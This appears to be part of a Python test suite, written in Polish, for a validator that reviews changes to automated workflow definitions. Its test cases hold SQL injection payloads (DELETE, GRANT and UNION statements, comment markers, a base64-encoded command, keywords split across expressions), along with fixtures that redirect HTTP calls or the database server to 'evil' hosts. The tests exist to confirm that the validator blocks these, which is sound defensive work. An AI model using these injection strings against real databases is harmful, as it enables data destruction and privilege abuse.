    ("nowe odwolanie do wejscia wyzwalacza odrzucone", "SELECT a FROM t",
     "SELECT a FROM t WHERE id = @{triggerBody()?['id']}", True),
    ("nowe wyrazenie z true odrzucone", "SELECT a FROM t", "SELECT a FROM t WHERE b = @{concat(true)}", True),
    ("nowy literal z myslnikami odrzucony", "SELECT a FROM t", "SELECT a FROM t WHERE b = 1 @{concat('--')}", True),
    ("nowy literal z jednym apostrofem odrzucony", "SELECT 'x' AS a", "SELECT 'x@{concat('''')}' AS a", True),
    ("apostrof wyciety z parzystego literalu odrzucony", "SELECT 'x' AS a",
     "SELECT 'x@{substring('''''', 0, 1)}; DELETE FROM t --' AS a", True),
    ("sklejenie z tekstem polecenia", "SELECT 1 AS a WHERE b = @{variables('X')}",
     "SELECT 1 AS a WHERE b = 1 DEL@{variables('X')}ETE FROM t", True),
    ("pusty literal sklejajacy slowo", "SELECT 1 AS a", "SELECT 1 AS a DEL@{''}ETE FROM t", True),
    ("literal z apostrofem w literale", "SELECT 'x' AS a", "SELECT 'x@{''''}; DELETE FROM t --' AS a", True),
    ("wyrazenie z minusem tworzacym komentarz", "SELECT 1 AS a WHERE b = @{variables('X')}",
     "SELECT 1 AS a WHERE b = 1 -@{variables('X')}", True),
    ("to samo wyrazenie w literale przechodzi", "SELECT a FROM t WHERE b = '@{variables('JW')}'",
     "SELECT a, c FROM t WHERE b = '@{variables('JW')}'", False),
]:
    d = copy.deepcopy(DEF6)
    d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = old
    errs6 = patch6([{"sciezka": SQLQ, "bylo": old, "ma_byc": new}], d)
    expect(f"SQL w flow-patch: {label}", any("zapytanie SQL" in e for e in errs6), bad)
SQLSRV6 = LOOP + ["PobierzdanePPE", "inputs", "parameters", "server"]
expect("SQL w flow-patch: zmiana serwera odrzucona",
       any("tylko tekst zapytania" in e for e in patch6([{"sciezka": SQLSRV6, "bylo": "default", "ma_byc": "evil.database.windows.net"}])), True)
d = copy.deepcopy(DEF6)
d["properties"]["definition"]["actions"]["Init_S"] = {"type": "InitializeVariable", "runAfter": {},
                                                     "inputs": {"variables": [{"name": "S", "type": "string", "value": "srv"}]}}
d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["server"] = "@variables('S')"
expect("SQL: zmienna z serwerem jest wrazliwa", ("var", "s") in C.sensitive_refs(d), True)
for label, uri in [("\\n przed item()", "https://x/@{\nitem()?['id']}"), ("\\t przed variables", "@{\tvariables('U')}"),
                   ("\\n przed items('L')", "https://x/@{\nitems('Apply_to_each')}")]:
    d = mod6(lambda a, i: (a.update(Init_U={"type": "InitializeVariable", "runAfter": {},
                                            "inputs": {"variables": [{"name": "U", "type": "string"}]}}),
                           i.update(H={"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": uri}})))
    expect(f"bialy znak przed funkcja: {label}", bool(C.sensitive_refs(d) & {("act", "apply_to_each"), ("var", "u")}), True)
d = mod6(lambda a, i: (a.update(Init_U={"type": "InitializeVariable", "runAfter": {},
                                        "inputs": {"variables": [{"name": "U", "type": "string"}]}}),
                       i.update(Cond={"type": "If", "runAfter": {}, "expression": {"equals": ["@item()?['env']", "prod"]},
                                      "actions": {"SetU": {"type": "SetVariable", "runAfter": {},
                                                           "inputs": {"name": "U", "value": "@item()?['url']"}}}},
                                H={"type": "Http", "runAfter": {"Cond": ["Succeeded"]},
                                   "inputs": {"method": "GET", "uri": "@variables('U')"}})))
expect("warunek nad akcja ustawiajaca adres jest wrazliwy", ("act", "cond") in C.sensitive_refs(d), True)
CONDX = LOOP + ["Cond", "expression"]
expect("flow-patch warunku nad akcja ustawiajaca adres odrzucony",
       any("akcja ustawia" in e for e in patch6([{"sciezka": CONDX, "bylo": {"equals": ["@item()?['env']", "prod"]},
                                                  "ma_byc": {"equals": ["@item()?['env']", "test"]}}], d)), True)
INITJW = ["properties", "definition", "actions", "Init_JW", "inputs", "variables", "0", "value"]
expect("zrodla SQL: Init_JW jest zrodlem wstawki do PobierzdanePPE",
       C.sql_source_hits(C.defines("Init_JW", DEF6["properties"]["definition"]["actions"]["Init_JW"]),
                         C.sql_insert_sources(DEF6)), ["PobierzdanePPE"])
for label, new, bad in [("stala z liczbami przechodzi", "590556731701300006,590556731701300007", False),
                        ("stala ze srednikiem odrzucona", "1; DELETE FROM t", True),
                        ("stala z apostrofem odrzucona", "1') OR ('1", True),
                        ("stala ze slowem zapisu odrzucona", "1) UNION SELECT 1 FROM t WHERE 1 IN (DELETE", True),
                        ("wyrazenie z literalem ze srednikiem odrzucone", "@{concat('1', '; DROP TABLE t')}", True),
                        ("wartosc wyliczana z danych przechodzi (znane ograniczenie)", "@{triggerBody()?['ppe']}", False)]:
    errs6 = patch6([{"sciezka": INITJW, "bylo": "", "ma_byc": new}])
    expect(f"zrodla SQL: {label}", any("zapytania SQL" in e for e in errs6), bad)
for label, old, new, bad in [
    ("nowe wyrazenie w nazwie w nawiasach", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM [t@{split('1',' ')} ; DELETE FROM t --]", True),
    ("split wstawiony jako tablica", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM t WHERE x = '@{take(split('1 2',' '),1)}'", True),
    ("first ze split przechodzi", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM t WHERE x = '@{first(split(variables('S'), ','))}'", False),
    ("liczba ujemna cieta jako tekst daje --", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM t WHERE x = 1 @{concat(substring(concat(sub(0,1)),0,1),sub(0,1))} '\nDELETE FROM t --'", True),
    ("dwa sasiednie wyrazenia", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM t WHERE x = 1 @{length(variables('A'))}@{length(variables('B'))}", True),
    ("wyrazenie dajace minus sklejone z minusem", "SELECT a FROM t WHERE x = 1",
     "SELECT a FROM t WHERE x = 1 @{substring(concat(sub(0,1)),0,1)}- 1", True),
    ("stare wyrazenie przeniesione z literalu do komentarza", "SELECT a FROM t WHERE n = '@{replace(triggerBody()?['n'],'''','''''')}'",
     "SELECT a FROM t WHERE n = 'x' -- @{replace(triggerBody()?['n'],'''','''''')}", True),
    ("stare wyrazenie przeniesione do nazwy w nawiasach", "SELECT a FROM t WHERE n = '@{replace(triggerBody()?['n'],'''','''''')}'",
     "SELECT [a @{replace(triggerBody()?['n'],'''','''''')}] FROM t", True),
]:
    d = copy.deepcopy(DEF6)
    d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = old
    errs6 = patch6([{"sciezka": SQLQ, "bylo": old, "ma_byc": new}], d)
    expect(f"SQL w flow-patch: {label}", any("zapytanie SQL" in e for e in errs6), bad)
DQ = copy.deepcopy(DEF6)
DQ["properties"]["definition"]["actions"]["Init_V"] = {"type": "InitializeVariable", "runAfter": {},
                                                      "inputs": {"variables": [{"name": "V", "type": "string", "value": "1"}]}}
DQ["properties"]["definition"]["actions"]["Cmp"] = {"type": "Compose", "runAfter": {}, "inputs": "1"}
QOLD = "SELECT a FROM t WHERE id = @{outputs('Cmp')}"
DQ["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = QOLD
INITV = ["properties", "definition", "actions", "Init_V", "inputs", "variables", "0", "value"]
CMPV = ["properties", "definition", "actions", "Cmp", "inputs"]
QNEW = "SELECT a FROM t WHERE id = @{outputs('Cmp')} OR id = @{variables('V')}"
expect("zrodla SQL: zmienna i nowe wyrazenie w jednym kroku",
       any("zapytania SQL" in e or "zapytanie SQL" in e or "do zapytania" in e for e in patch6(
           [{"sciezka": INITV, "bylo": "1", "ma_byc": "1 DELETE FROM t"},
            {"sciezka": SQLQ, "bylo": QOLD, "ma_byc": QNEW}], DQ)), True)
DQ2 = copy.deepcopy(DQ)
DQ2["properties"]["definition"]["actions"]["Init_V"]["inputs"]["variables"][0]["value"] = "1 DELETE FROM t"
expect("zrodla SQL: nowe wyrazenie podlaczajace istniejaca stala z poleceniem",
       any("do zapytania" in e for e in patch6([{"sciezka": SQLQ, "bylo": QOLD, "ma_byc": QNEW}], DQ2)), True)
expect("zrodla SQL: nowe wyrazenie podlaczajace bezpieczna stala przechodzi",
       patch6([{"sciezka": SQLQ, "bylo": QOLD, "ma_byc": QNEW}], DQ), [])
for label, new, bad in [("slowo sklejone z literalem", "1 DEL@{'ETE'} FROM t", True),
                        ("concat liter", "1 @{concat('DEL','ETE')} FROM t", True),
                        ("toUpper", "@{toUpper('del')}ETE FROM t", True),
                        ("base64ToString", "@{base64ToString('MSBERUxFVEUgRlJPTSB0')}", True),
                        ("cale wyrazenie base64ToString", "@base64ToString('MSBERUxFVEUgRlJPTSB0')", True),
                        ("SELECT INTO", "* INTO dbo.kopia", True),
                        ("GRANT", "1 GRANT CONTROL TO x", True),
                        ("slowo zlozone przez if", "DEL@{if(equals(1,1),'ETE','X')} FROM t", True),
                        ("poczatek komentarza blokowego", "1 /*", True),
                        ("komentarz liniowy", "1 --", True),
                        ("cudzyslow i nawias nazwy", 'a"]', True),
                        ("data z myslnikami przechodzi", "2026-01-01", False),
                        ("tablica", ["1"], True),
                        ("obiekt", {"1": "1"}, True),
                        ("liczba przechodzi", "42", False)]:
    errs6 = patch6([{"sciezka": CMPV, "bylo": "1", "ma_byc": new}], DQ)
    expect(f"zrodla SQL: stala w Compose: {label}", any("zapytania SQL" in e for e in errs6), bad)
P = importlib.reload(P)
P.read_workflow = lambda step: wf6(DEF6)
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.flow_patch_preview({"oczekiwany_modifiedon": "m", "zmiany": [{"sciezka": INITJW, "bylo": "", "ma_byc": "1"}],
                          "srodowisko": DV, "workflowid": WF3})
expect("plan-check oznacza zmiane zrodla wstawki SQL",
       "[zmienia dane wstawiane do zapytania SQL: PobierzdanePPE]" in buf.getvalue(), True)
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    P.flow_patch_preview({"oczekiwany_modifiedon": "m", "zmiany": [{"sciezka": SQLQ, "bylo": SQL_OLD, "ma_byc": SQL_NEW}],
                          "srodowisko": DV, "workflowid": WF3})
expect("plan-check oznacza zmiane zapytania SQL", "ZAPYTANIE SQL: stare tylko odczyt: tak, nowe tylko odczyt: tak" in buf.getvalue(), True)

print("39. 1.4.2: runAfter akcji, od ktorych zalezy adres")
DEF7 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init_url": {"type": "InitializeVariable", "runAfter": {},
                 "inputs": {"variables": [{"name": "url", "type": "string", "value": ""}]}},
    "SetEvil": {"type": "SetVariable", "runAfter": {"Init_url": ["Succeeded"]},
                "inputs": {"name": "url", "value": "https://evil.example.com"}},
    "SetGood": {"type": "SetVariable", "runAfter": {"SetEvil": ["Succeeded"]},
                "inputs": {"name": "url", "value": "https://api.example.com"}},
    "Inny": {"type": "Compose", "runAfter": {"SetGood": ["Succeeded"]}, "inputs": "x"},
    "H": {"type": "Http", "runAfter": {"Inny": ["Succeeded"]}, "inputs": {"method": "GET", "uri": "@variables('url')"}},
}}}}
A7 = ["properties", "definition", "actions"]
REORDER = [{"sciezka": A7 + ["SetGood", "runAfter"], "bylo": {"SetEvil": ["Succeeded"]}, "ma_byc": {"Init_url": ["Succeeded"]}},
           {"sciezka": A7 + ["SetEvil", "runAfter"], "bylo": {"Init_url": ["Succeeded"]}, "ma_byc": {"SetGood": ["Succeeded"]}},
           {"sciezka": A7 + ["Inny", "runAfter"], "bylo": {"SetGood": ["Succeeded"]}, "ma_byc": {"SetEvil": ["Succeeded"]}}]
expect("runAfter: zamiana kolejnosci SetGood/SetEvil w flow-patch odrzucona",
       any("akcja ustawia" in e for e in patch6(REORDER, DEF7)), True)
expect("runAfter: zmiana statusu runAfter akcji ustawiajacej adres odrzucona",
       any("akcja ustawia" in e for e in patch6([{"sciezka": A7 + ["SetGood", "runAfter"], "bylo": {"SetEvil": ["Succeeded"]},
                                                 "ma_byc": {"SetEvil": ["Failed"]}}], DEF7)), True)
expect("runAfter: akcja niezalezna od adresu nadal do zmiany",
       patch6([{"sciezka": A7 + ["Inny", "runAfter"], "bylo": {"SetGood": ["Succeeded"]},
                "ma_byc": {"SetGood": ["Succeeded", "Failed"]}}], DEF7), [])
d7 = copy.deepcopy(DEF7)
for ch in REORDER:
    set_path = ch["sciezka"][len(A7):]
    d7["properties"]["definition"]["actions"][set_path[0]]["runAfter"] = ch["ma_byc"]
expect("runAfter: przestawienie w flow-definition odrzucone", any("akcja ustawia" in e for e in defn6(d7, DEF7)), True)
expect("runAfter: ITS-418 plan A nadal przechodzi", defn6(planA(copy.deepcopy(DEF6))), [])
DEF8 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "X": {"type": "Compose", "runAfter": {"Init": ["Succeeded"]}, "inputs": "x"},
    "Http": {"type": "Http", "runAfter": {"X": ["Succeeded"]}, "inputs": {"method": "POST", "uri": "@variables('url')"}},
    "Sc": {"type": "Scope", "runAfter": {"Http": ["Succeeded"]}, "actions": {
        "SetB": {"type": "SetVariable", "runAfter": {}, "inputs": {"name": "url", "value": "https://b"}}}},
}}}}
DEF9 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "InitD": {"type": "InitializeVariable", "runAfter": {"Init": ["Succeeded"]},
              "inputs": {"variables": [{"name": "dane", "type": "string", "value": "tajne"}]}},
    "Http": {"type": "Http", "runAfter": {"InitD": ["Succeeded"]},
             "inputs": {"method": "POST", "uri": "@variables('url')", "body": "@variables('dane')"}},
    "SetB": {"type": "SetVariable", "runAfter": {"InitD": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://b"}},
    "Http2": {"type": "Http", "runAfter": {"SetB": ["Succeeded"]}, "inputs": {"method": "GET", "uri": "@variables('url')"}},
    "Inny": {"type": "Compose", "runAfter": {"InitD": ["Succeeded"]}, "inputs": "x"},
}}}}
expect("kolejnosc: przepiecie runAfter akcji wysylajacej za inna akcje ustawiajaca adres odrzucone (A)",
       any("kolejnosci wykonania" in e for e in patch6([{"sciezka": A7 + ["Http", "runAfter"], "bylo": {"InitD": ["Succeeded"]},
                                                        "ma_byc": {"SetB": ["Succeeded"]}}], DEF9)), True)
d9 = copy.deepcopy(DEF9)
d9["properties"]["definition"]["actions"]["Http"]["runAfter"] = {"SetB": ["Succeeded"]}
expect("kolejnosc: to samo w flow-definition odrzucone", any("kolejnosci wykonania" in e for e in defn6(d9, DEF9)), True)
DEF10 = copy.deepcopy(DEF9)
DEF10["properties"]["definition"]["actions"]["Http"]["runAfter"] = {"Inny": ["Succeeded"]}
expect("kolejnosc: akcja posredniczaca przy rownoleglej galezi (C) odrzucona",
       any("kolejnosci wykonania" in e for e in patch6([{"sciezka": A7 + ["Inny", "runAfter"], "bylo": {"InitD": ["Succeeded"]},
                                                        "ma_byc": {"SetB": ["Succeeded"]}}], DEF10)), True)
DEF10b = copy.deepcopy(DEF10)
DEF10b["properties"]["definition"]["actions"]["Koniec"] = {"type": "Compose", "runAfter": {"Http": ["Succeeded"]}, "inputs": "k"}
expect("kolejnosc: zmiana runAfter akcji bez wplywu na kolejnosc przechodzi",
       patch6([{"sciezka": A7 + ["Koniec", "runAfter"], "bylo": {"Http": ["Succeeded"]},
                "ma_byc": {"Http": ["Succeeded", "Failed"]}}], DEF10b), [])
expect("wyscig: zmiana statusu runAfter akcji przed akcja wysylajaca w wyscigu odrzucona",
       any("rownolegle" in e for e in patch6([{"sciezka": A7 + ["Inny", "runAfter"], "bylo": {"InitD": ["Succeeded"]},
                                               "ma_byc": {"InitD": ["Succeeded", "Failed"]}}], DEF10)), True)
expect("kolejnosc: rownolegle galezie bez zmian przechodza",
       patch6([{"sciezka": A7 + ["Inny", "inputs"], "bylo": "x", "ma_byc": "y"}], DEF9), [])
DEF11 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "Cpos": {"type": "Compose", "runAfter": {"Init": ["Succeeded"]}, "inputs": "x"},
    "SetGood": {"type": "SetVariable", "runAfter": {"Cpos": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://good"}},
    "SetEvil": {"type": "SetVariable", "runAfter": {"Init": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://evil"}},
    "Http": {"type": "Http", "runAfter": {"SetGood": ["Succeeded"], "SetEvil": ["Succeeded"]},
             "inputs": {"method": "GET", "uri": "@variables('url')"}},
}}}}
d11 = copy.deepcopy(DEF11)
d11["properties"]["definition"]["actions"]["W"] = {"type": "Wait", "runAfter": {"Init": ["Succeeded"]},
                                                  "inputs": {"interval": {"count": 1, "unit": "Minute"}}}
d11["properties"]["definition"]["actions"]["Cpos"]["runAfter"] = {"W": ["Succeeded"]}
expect("wyscig: opoznienie galezi z akcja ustawiajaca (Wait) odrzucone",
       any("rownolegle" in e for e in defn6(d11, DEF11)), True)
expect("wyscig: zmiana runAfter akcji w galezi wyscigu (flow-patch) odrzucona",
       any("rownolegle" in e for e in patch6([{"sciezka": A7 + ["Cpos", "runAfter"], "bylo": {"Init": ["Succeeded"]},
                                               "ma_byc": {"Init": ["Succeeded", "Failed"]}}], DEF11)), True)
DEF12 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "SetEvil": {"type": "SetVariable", "runAfter": {"Init": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://evil"}},
    "U": {"type": "Until", "runAfter": {"Init": ["Succeeded"]}, "expression": "@equals(1,1)", "limit": {"count": 1},
          "actions": {"Http": {"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "@variables('url')"}}}},
}}}}
d12 = copy.deepcopy(DEF12)
d12["properties"]["definition"]["actions"]["U"]["limit"] = {"count": 60}
d12["properties"]["definition"]["actions"]["U"]["expression"] = "@equals(1,0)"
expect("wyscig: wydluzenie petli Until z akcja wysylajaca odrzucone", any("rownolegle" in e for e in defn6(d12, DEF12)), True)
DEF13 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "SetEvil": {"type": "SetVariable", "runAfter": {"Init": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://evil"}},
    "W": {"type": "Wait", "runAfter": {"SetEvil": ["Succeeded"]}, "inputs": {"interval": {"count": 0, "unit": "Second"}}},
    "SetGood": {"type": "SetVariable", "runAfter": {"W": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://good"}},
    "N": {"type": "Compose", "runAfter": {"SetGood": ["Succeeded"]}, "inputs": "n"},
    "Comp": {"type": "Compose", "runAfter": {"N": ["Succeeded"]}, "inputs": "@variables('url')"},
    "Http": {"type": "Http", "runAfter": {"Comp": ["Succeeded"], "SetGood": ["Succeeded"]},
             "inputs": {"method": "GET", "uri": "@outputs('Comp')"}},
}}}}
expect("kolejnosc: posrednik czytajacy adres przestawiony przed akcje ustawiajaca odrzucony",
       any("kolejnosci" in e or "rownolegle" in e for e in patch6(
           [{"sciezka": A7 + ["N", "runAfter"], "bylo": {"SetGood": ["Succeeded"]}, "ma_byc": {"SetEvil": ["Succeeded"]}}],
           DEF13)), True)
DEF14 = {"properties": {"connectionReferences": {}, "definition": {"triggers": {"manual": {"type": "Request"}}, "actions": {
    "Init": {"type": "InitializeVariable", "runAfter": {},
             "inputs": {"variables": [{"name": "url", "type": "string", "value": "https://a"}]}},
    "SetEvil": {"type": "SetVariable", "runAfter": {"Init": ["Succeeded"]}, "inputs": {"name": "url", "value": "https://evil"}},
    "Q": {"type": "Scope", "runAfter": {"Init": ["Succeeded"]}, "actions": {
        "Wq": {"type": "Wait", "runAfter": {}, "inputs": {"interval": {"count": 0, "unit": "Second"}}}}},
    "Y": {"type": "Scope", "runAfter": {"Q": ["Succeeded"]}, "actions": {
        "Http": {"type": "Http", "runAfter": {}, "inputs": {"method": "GET", "uri": "@variables('url')"}}}},
}}}}
d14 = copy.deepcopy(DEF14)
d14["properties"]["definition"]["actions"]["Q"]["actions"]["Wq"]["inputs"]["interval"]["count"] = 60
expect("wyscig: Wait w srodku zakresu poprzedzajacego akcje wysylajaca odrzucony",
       any("rownolegle" in e for e in defn6(d14, DEF14)), True)
expect("runAfter: Scope z akcja ustawiajaca adres jest wrazliwy", ("act", "sc") in C.sensitive_refs(DEF8), True)
expect("runAfter: przestawienie Scope z akcja ustawiajaca adres odrzucone",
       any("akcja ustawia" in e for e in patch6([{"sciezka": A7 + ["Sc", "runAfter"], "bylo": {"Http": ["Succeeded"]},
                                                 "ma_byc": {"Init": ["Succeeded"]}},
                                                {"sciezka": A7 + ["X", "runAfter"], "bylo": {"Init": ["Succeeded"]},
                                                 "ma_byc": {"Sc": ["Succeeded"]}}], DEF8)), True)

print("40. 1.4.3: wyjatki w zrodlach wstawek SQL (warunki, '@{pole}',)")


def def15(append_value, where="@and(equals(item()?['a'], 'JW'), contains(split(string(coalesce(item()?['b'], '')), ','), '1'))"):
    d = copy.deepcopy(DEF6)
    a = d["properties"]["definition"]["actions"]
    a["Init_JWX"] = {"type": "InitializeVariable", "runAfter": {},
                     "inputs": {"variables": [{"name": "JWX", "type": "string", "value": ""}]}}
    inner = a["Apply_to_each"]["actions"]
    inner["Filter_X"] = {"type": "Query", "runAfter": {"List_rows_3": ["Succeeded"]},
                         "inputs": {"from": "@body('List_rows_3')?['value']", "where": where}}
    inner["Each_X"] = {"type": "Foreach", "runAfter": {"Filter_X": ["Succeeded"]}, "foreach": "@body('Filter_X')",
                       "actions": {"Append_X": {"type": "AppendToStringVariable", "runAfter": {},
                                                "inputs": {"name": "JWX", "value": append_value}}}}
    inner["Append_JW"]["runAfter"] = {"Each_X": ["Succeeded"]}
    return d


QB_OLD = "SELECT a FROM t WHERE b IN (@{variables('JW')})"
QB_NEW = "SELECT a FROM t WHERE b IN (@{variables('JW')}) OR c IN (@{variables('JWX')}'')"


def plan_b_like(d):
    d["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = QB_OLD
    return patch6([{"sciezka": SQLQ, "bylo": QB_OLD, "ma_byc": QB_NEW}], d)


expect("zrodla SQL: wzorzec ITS-418 (where z funkcjami, '@{pole}',) przechodzi",
       plan_b_like(def15("'@{items('Each_X')?['eko_value_text']}',")), [])
for label, value in [("'@{...}'; DELETE", "'@{items('Each_X')?['v']}'; DELETE FROM t"),
                     ("'x' + '@{...}'", "'x' + '@{items('Each_X')?['v']}'"),
                     ("dwa odwolania", "'@{items('Each_X')?['v']}','@{items('Each_X')?['w']}'"),
                     ("concat w wartosci", "'@{concat(items('Each_X')?['v'], 'x')}',"),
                     ("replace w wartosci", "@{replace(items('Each_X')?['v'], 'a', 'b')}"),
                     ("formatString", "@{formatString('{0}', items('Each_X')?['v'])}"),
                     ("apostrof w innej stalej", "a'b"),
                     ("koncowa nowa linia", "'@{items('Each_X')?['v']}',\n")]:
    expect(f"zrodla SQL: nadal odrzucone: {label}", any("do zapytania" in e for e in plan_b_like(def15(value))), True)
expect("zrodla SQL: concat poza warunkiem (Compose zrodlem) odrzucony",
       any("zapytania SQL" in e for e in patch6([{"sciezka": CMPV, "bylo": "1", "ma_byc": "@{concat('1', '2')}"}], DQ)), True)
WHERE15 = LOOP + ["Filter_X", "inputs", "where"]
d15 = def15("'@{items('Each_X')?['eko_value_text']}',")
d15["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = QB_NEW
expect("zrodla SQL: zmiana warunku where w zrodle przechodzi (wyjatek a)",
       [e for e in patch6([{"sciezka": WHERE15, "bylo": d15["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["Filter_X"]["inputs"]["where"],
                            "ma_byc": "@equals(item()?['a'], 'FW')"}], d15) if "zapytania SQL" in e], [])
APP15 = LOOP + ["Each_X", "actions", "Append_X", "inputs", "value"]
expect("zrodla SQL: zmiana wartosci zrodla na '@{pole}', przechodzi (wyjatek b)",
       [e for e in patch6([{"sciezka": APP15, "bylo": "'@{items('Each_X')?['eko_value_text']}',",
                            "ma_byc": "'@{items('Each_X')?['eko_value']}',"}], d15) if "zapytania SQL" in e], [])
d15b = copy.deepcopy(d15)
d15b["properties"]["definition"]["actions"]["Init_cmd"] = {"type": "InitializeVariable", "runAfter": {},
                                                          "inputs": {"variables": [{"name": "cmd", "type": "string",
                                                                                    "value": "x') DELETE FROM t --"}]}}
expect("zrodla SQL: zrodlo przepiete na istniejaca zmienna ze stala z poleceniem odrzucone",
       any("zapytania SQL" in e for e in patch6([{"sciezka": APP15, "bylo": "'@{items('Each_X')?['eko_value_text']}',",
                                                  "ma_byc": "'@{variables('cmd')}',"}], d15b)), True)
d15c = def15("'@{items('Each_X')?['v']}'")
d15c["properties"]["definition"]["actions"]["Init_ARR"] = {"type": "InitializeVariable", "runAfter": {},
                                                          "inputs": {"variables": [{"name": "ARR", "type": "array"}]}}
d15c["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["Each_X"]["actions"]["Append_X"] = {
    "type": "AppendToArrayVariable", "runAfter": {}, "inputs": {"name": "ARR", "value": "'@{items('Each_X')?['v']}'"}}
d15c["properties"]["definition"]["actions"]["Apply_to_each"]["actions"]["PobierzdanePPE"]["inputs"]["parameters"]["query/query"] = QB_OLD
expect("zrodla SQL: zmienna tablicowa (JSON z [ ]) wstawiona do zapytania odrzucona",
       any("do zapytania" in e for e in patch6([{"sciezka": SQLQ, "bylo": QB_OLD,
                                                 "ma_byc": QB_OLD + " OR c IN (@{variables('ARR')})"}], d15c)), True)
expect("zrodla SQL: zmiana wartosci zrodla na '@{pole}'; DELETE odrzucona",
       any("zapytania SQL" in e for e in patch6([{"sciezka": APP15, "bylo": "'@{items('Each_X')?['eko_value_text']}',",
                                                  "ma_byc": "'@{items('Each_X')?['v']}'; DELETE FROM t"}], d15)), True)

print()
print("WSZYSTKO OK" if not FAILS else f"NIEUDANE: {FAILS}")
sys.exit(1 if FAILS else 0)
